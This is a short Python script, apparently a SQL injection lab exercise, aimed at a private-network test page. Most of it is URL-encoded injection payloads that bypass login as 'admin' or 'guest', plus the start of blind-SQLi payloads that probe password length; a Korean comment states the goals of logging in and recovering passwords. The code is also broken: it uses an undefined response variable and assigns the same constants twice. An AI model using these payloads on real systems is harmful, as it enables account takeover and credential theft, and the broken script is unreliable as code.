import requests
import string

abc = string.digits + string.ascii_letters

URL = "http://192.168.81.129/sqli/sqli4.php"
PAYLOAD01 = "?upw=1%27%20or%20uid=%27admin%27--%09-"
PAYLOAD02 = "?upw=1%27%20or%20uid=%27guest%27--%09-"
PAYLOAD03_LEN_START = "?upw=1%27%20or%20uid=%27guest%27%20and%20length(upw)="
PAYLOAD03_END = "--%09-"
PAYLOAD03_LEN_START = "?upw=1%27%20or%20uid=%27admin%27%20and%20length(upw)="
PAYLOAD03_END = "--%09-"

if resp.text.find('Success!!') > 0:
    print('Stage Clear')
else:
    print('Not yet')

'''
1번 목표 : guest, admin 로그인 -> 단순 sqli & Blind Sqli 직후 정확한 패스워드 둘다 시도
2번 목표 : guest, admin 패스워드 찾기 -> Blind Sqli 이용
'''